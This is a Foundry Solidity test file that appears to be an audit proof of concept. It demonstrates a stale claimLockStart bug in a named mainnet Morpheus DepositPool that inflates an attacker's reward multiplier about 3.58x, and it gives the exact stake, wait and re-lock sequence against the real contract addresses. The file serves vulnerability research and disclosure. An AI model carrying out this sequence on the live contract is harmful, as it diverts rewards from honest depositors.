// SPDX-License-Identifier: MIT
// Morpheus round 5 — Route 2: DepositPool v7 `lockClaim` stale-claimLockStart
// multiplier inflation, on an Ethereum mainnet fork.
// Target: DepositPool USDC 0x6cCE082851Add4c535352f596662521B4De4750E, reward pool 0.
// Fork block: 26426622 (2026-11-16).
//
// Candidate C-1: `lockClaim` keeps a stale `claimLockStart` from a long-expired
// lock (DepositPool.sol:323: `claimLockStart_ = userData.claimLockStart > 0 ?
// userData.claimLockStart : now`). Only `_claim` resets the start to 0; a
// re-lock WITHOUT an intervening claim preserves it. The lock multiplier is
// POSITION-based on the global window [2024-07-25, 2040-01-26], so the
// multiplier is computed over [staleStart, newEnd] — years the user was never
// locked (free to claim after the old lock expired).
// Independent Python cross-check at fork ts 1794820451:
//   attacker: stake T0, 1-day lock, wait 730d, re-lock 1 day -> 3.5825x
//   control:  fresh 1-day lock at T0+730d                     -> 1.0x (floor)
// Tests:
//   (a) attacker virtualDeposited after re-lock ~= 3.58x deposited, and
//       claimLockStart is STILL the original T0 (stale);
//   (b) control fresh 1-day lock -> virtualDeposited == deposited (1.0x);
//   (c) 30-day reward DELTA (pending at claim minus pending right after the
//       (re-)lock) attacker vs control: attacker earns a multiple of control
//       for the same 30-day forward lock on the same deposit. The window is
//       30 days (not 1) because minRewardsDistributePeriod = 86400s silently
//       skips shorter second distributions, and because a static fork needs
//       the aUSDC-yield mock (see _mockYieldAccrual) for the window emission
//       to reach the pool at all.
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address a) external view returns (uint256);
}

interface IDistributor {
    function distributeRewards(uint256 i) external;
    function getDistributedRewards(uint256 i, address pool) external view returns (uint256);
    function depositPools(uint256 i, address pool)
        external
        view
        returns (
            address token,
            string memory chainLinkPath,
            uint256 tokenPrice,
            uint256 deposited,
            uint256 lastUnderlyingBalance,
            uint8 strategy,
            address aToken,
            bool isExist
        );
}

interface IDepositPool {
    function stake(uint256 rewardPoolIndex_, uint256 amount_, uint128 claimLockEnd_, address referrer_) external;
    function claim(uint256 rewardPoolIndex_, address receiver_) external payable;
    function lockClaim(uint256 rewardPoolIndex_, uint128 claimLockEnd_) external;
    function getLatestUserReward(uint256, address) external view returns (uint256);
    function rewardPoolsData(uint256)
        external
        view
        returns (uint128 lastUpdate, uint256 rate, uint256 totalVirtualDeposited);
    function usersData(address, uint256)
        external
        view
        returns (
            uint128 lastStake,
            uint256 deposited,
            uint256 rate,
            uint256 pendingRewards,
            uint128 claimLockStart,
            uint128 claimLockEnd,
            uint256 virtualDeposited,
            uint128 lastClaim,
            address referrer
        );
}

contract StaleLockStartTest is Test {
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant POOL_USDC = 0x6cCE082851Add4c535352f596662521B4De4750E;
    address constant DISTRIBUTOR = 0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A;
    uint256 constant POOL_IDX = 0;
    uint256 constant DEPOSIT = 100_000e6; // 100,000 USDC

    IDistributor dist = IDistributor(DISTRIBUTOR);
    IDepositPool pool = IDepositPool(POOL_USDC);

    address attacker = makeAddr("attacker");
    address control = makeAddr("control");

    event UserClaimed(uint256 indexed rewardPoolIndex, address indexed user, address receiver, uint256 amount);

    function setUp() public {
        vm.createSelectFork("https://ethereum.publicnode.com", 26426622);
        // Keep Chainlink prices "fresh" on the fork (live K-5 behaviour).
        address clc = 0xd182263d06FDC463c96190005D6359CC3d3Bbc5e;
        bytes4 sel = bytes4(keccak256("getChainLinkDataFeedLatestAnswer(bytes32)"));
        vm.mockCall(clc, abi.encodeWithSelector(sel, keccak256(bytes("stETH/USD"))), abi.encode(uint256(1816309686310000000000)));
        vm.mockCall(clc, abi.encodeWithSelector(sel, keccak256(bytes("wETH/USD"))), abi.encode(uint256(1817643198690000000000)));
        vm.mockCall(clc, abi.encodeWithSelector(sel, keccak256(bytes("wBTC/BTC,BTC/USD"))), abi.encode(uint256(64789292446020000000000)));
        vm.mockCall(clc, abi.encodeWithSelector(sel, keccak256(bytes("USDC/USD"))), abi.encode(uint256(999781600000000000)));
        vm.mockCall(clc, abi.encodeWithSelector(sel, keccak256(bytes("USDT/USD"))), abi.encode(uint256(999144630000000000)));
        deal(USDC, attacker, DEPOSIT);
        deal(USDC, control, DEPOSIT);
        vm.deal(attacker, 10 ether);
        vm.deal(control, 10 ether);
        vm.prank(attacker); IERC20(USDC).approve(DISTRIBUTOR, type(uint256).max);
        vm.prank(control); IERC20(USDC).approve(DISTRIBUTOR, type(uint256).max);
    }

    function _usersData(address u)
        internal
        view
        returns (uint128 claimLockStart, uint128 claimLockEnd, uint256 virtualDeposited, uint256 deposited)
    {
        (, deposited, , , claimLockStart, claimLockEnd, virtualDeposited, , ) = pool.usersData(u, POOL_IDX);
    }

    function _claimedAmount() internal returns (uint256 claimedAmt, bool found) {
        Vm.Log[] memory logs = vm.getRecordedLogs();
        bytes32 sig = keccak256("UserClaimed(uint256,address,address,uint256)");
        for (uint256 i = 0; i < logs.length; i++) {
            if (logs[i].topics[0] == sig && logs[i].emitter == POOL_USDC) {
                (, claimedAmt) = abi.decode(logs[i].data, (address, uint256));
                found = true;
            }
        }
    }

    function testStaleLockStartInflatesMultiplier() public {
        uint128 t0 = uint128(block.timestamp);
        // Attacker stakes 100k USDC with a 1-day lock at T0.
        vm.prank(attacker); pool.stake(POOL_IDX, DEPOSIT, t0 + 1 days, address(0));
        (uint128 start0, , uint256 virt0, ) = _usersData(attacker);
        assertEq(start0, t0, "start == T0 after first stake");
        assertEq(virt0, DEPOSIT, "fresh 1-day lock: virtual == deposited (1.0x)");

        // Wait 730 days. The original lock expired after day 1; the attacker
        // was free to claim the whole time and never did (no stake/withdraw/
        // claim in between, so claimLockStart is untouched).
        vm.warp(block.timestamp + 730 days);
        uint128 tRelock = uint128(block.timestamp);

        // Re-lock for just 1 more day.
        vm.prank(attacker); pool.lockClaim(POOL_IDX, tRelock + 1 days);
        (uint128 start1, uint128 end1, uint256 virt1, ) = _usersData(attacker);
        assertEq(start1, t0, "STALE START: claimLockStart still == T0 after re-lock");
        assertEq(end1, tRelock + 1 days, "new lock end == now + 1 day");
        emit log_named_uint("attacker virtualDeposited after re-lock (USDC 6dp)", virt1);
        emit log_named_uint("attacker deposited (USDC 6dp)", DEPOSIT);
        // Expected multiplier ~3.5825x (independent Python tanh cross-check).
        // Allow a small band for on-chain fixed-point rounding.
        assertGe(virt1, (DEPOSIT * 350) / 100, "virtual >= 3.50x deposited");
        assertLe(virt1, (DEPOSIT * 365) / 100, "virtual <= 3.65x deposited");
    }

    function testControlFreshLockIsOneX() public {
        vm.warp(block.timestamp + 730 days);
        uint128 t1 = uint128(block.timestamp);
        vm.prank(control); pool.stake(POOL_IDX, DEPOSIT, t1 + 1 days, address(0));
        (uint128 startC, , uint256 virtC, ) = _usersData(control);
        assertEq(startC, t1, "control start == stake time");
        assertEq(virtC, DEPOSIT, "fresh 1-day lock at T0+730d: virtual == deposited (1.0x)");
    }

    // NOTE on the measurement window (read before judging the mock below):
    // `distributeRewards` CONSUMES the live yield — it snapshots the current
    // aToken balance as `lastUnderlyingBalance` (DistributorV2.sol, yield loop).
    // On a static fork AAVE balances never grow with warps, so a SECOND
    // distribution after the first one sees totalYield == 0 and routes the
    // whole window emission to `undistributedRewards` (r4's totalYield==0
    // branch) — pool rates do not move and no user accrues. On mainnet, AAVE
    // yield accrues continuously, so a real 30-day window DOES have new yield.
    // The mock below simulates exactly that: aUSDC balanceOf(Distributor) =
    // lastUnderlyingBalance + 10,000 aUSDC, i.e. 30 days of yield accrual on
    // the USDC pool only. The other four pools' yields stay 0 (consumed), so
    // the window emission goes ~100% to the USDC pool in BOTH legs — the
    // attacker/control comparison stays apples-to-apples. The window is 30
    // days (>> minRewardsDistributePeriod = 86400s, which silently skips
    // shorter second distributions).
    function _mockYieldAccrual() internal {
        (, , , , uint256 lastBal, , address aToken, ) = dist.depositPools(POOL_IDX, POOL_USDC);
        vm.mockCall(
            aToken,
            abi.encodeWithSelector(IERC20.balanceOf.selector, DISTRIBUTOR),
            abi.encode(lastBal + 10_000e6)
        );
    }

    function testStaleRewardsDeltaVsControl() public {
        // --- Attacker leg (same fork, same schedule as the control leg) ---
        uint128 t0 = uint128(block.timestamp);
        vm.prank(attacker); pool.stake(POOL_IDX, DEPOSIT, t0 + 1 days, address(0));
        vm.warp(block.timestamp + 730 days);
        vm.prank(attacker); pool.lockClaim(POOL_IDX, uint128(block.timestamp) + 30 days);
        // Pending right after the re-lock = 730 days of accrual at the OLD 1x
        // rate. The 30-day gain is measured as the DELTA from here.
        uint256 pendingAfterRelock = pool.getLatestUserReward(POOL_IDX, attacker);
        (, , uint256 virtA, ) = _usersData(attacker);
        (, , uint256 totalVirtA) = pool.rewardPoolsData(POOL_IDX);
        uint256 poolDistBefore = dist.getDistributedRewards(POOL_IDX, POOL_USDC);
        _mockYieldAccrual();
        vm.warp(block.timestamp + 30 days + 1); // +1s: claim needs ts > claimLockEnd (strict)
        dist.distributeRewards(POOL_IDX);
        uint256 poolDistAfter = dist.getDistributedRewards(POOL_IDX, POOL_USDC);
        uint256 windowEmission = poolDistAfter - poolDistBefore;
        assertGt(windowEmission, 0, "window emission reaches the USDC pool");
        uint256 pendingAtClaim = pool.getLatestUserReward(POOL_IDX, attacker);
        assertGt(pendingAtClaim, pendingAfterRelock, "attacker accrues during final 30-day lock");
        uint256 gainAttacker = pendingAtClaim - pendingAfterRelock;
        // Expected gain = window emission x attacker's virtual share of the pool.
        uint256 expectedGain = (windowEmission * virtA) / totalVirtA;
        emit log_named_uint("attacker 30-day gain (wei MOR)", gainAttacker);
        emit log_named_uint("attacker expected gain (wei MOR)", expectedGain);
        emit log_named_uint("window emission to USDC pool (wei MOR)", windowEmission);
        assertGe(gainAttacker, (expectedGain * 98) / 100, "attacker gain >= 98% of expected");
        assertLe(gainAttacker, (expectedGain * 102) / 100, "attacker gain <= 102% of expected");

        vm.recordLogs();
        vm.prank(attacker); pool.claim{value: 0.1 ether}(POOL_IDX, attacker);
        (uint256 claimedA, bool foundA) = _claimedAmount();
        assertTrue(foundA, "attacker UserClaimed emitted");
        assertEq(claimedA, pendingAtClaim, "attacker claim pays exactly pre-claim pending");
        emit log_named_uint("attacker total claimed incl 730d backlog (wei MOR)", claimedA);
    }

    function testControlRewardsDelta() public {
        // --- Control leg: fresh stake at T0+730d, 30-day lock, claim after 30d ---
        vm.warp(block.timestamp + 730 days);
        uint128 t1 = uint128(block.timestamp);
        vm.prank(control); pool.stake(POOL_IDX, DEPOSIT, t1 + 30 days, address(0));
        uint256 pendingAfterStake = pool.getLatestUserReward(POOL_IDX, control);
        (, , uint256 virtC, ) = _usersData(control);
        (, , uint256 totalVirtC) = pool.rewardPoolsData(POOL_IDX);
        uint256 poolDistBefore = dist.getDistributedRewards(POOL_IDX, POOL_USDC);
        _mockYieldAccrual();
        vm.warp(block.timestamp + 30 days + 1); // +1s: claim needs ts > claimLockEnd (strict)
        dist.distributeRewards(POOL_IDX);
        uint256 poolDistAfter = dist.getDistributedRewards(POOL_IDX, POOL_USDC);
        uint256 windowEmission = poolDistAfter - poolDistBefore;
        assertGt(windowEmission, 0, "window emission reaches the USDC pool");
        uint256 pendingAtClaim = pool.getLatestUserReward(POOL_IDX, control);
        assertGt(pendingAtClaim, pendingAfterStake, "control accrues during 30-day lock");
        uint256 gainControl = pendingAtClaim - pendingAfterStake;
        uint256 expectedGain = (windowEmission * virtC) / totalVirtC;
        emit log_named_uint("control 30-day gain (wei MOR)", gainControl);
        emit log_named_uint("control expected gain (wei MOR)", expectedGain);
        emit log_named_uint("window emission to USDC pool (wei MOR)", windowEmission);
        assertGe(gainControl, (expectedGain * 98) / 100, "control gain >= 98% of expected");
        assertLe(gainControl, (expectedGain * 102) / 100, "control gain <= 102% of expected");

        vm.recordLogs();
        vm.prank(control); pool.claim{value: 0.1 ether}(POOL_IDX, control);
        (uint256 claimedC, bool foundC) = _claimedAmount();
        assertTrue(foundC, "control UserClaimed emitted");
        assertEq(claimedC, pendingAtClaim, "control claim pays exactly pre-claim pending");
    }
}
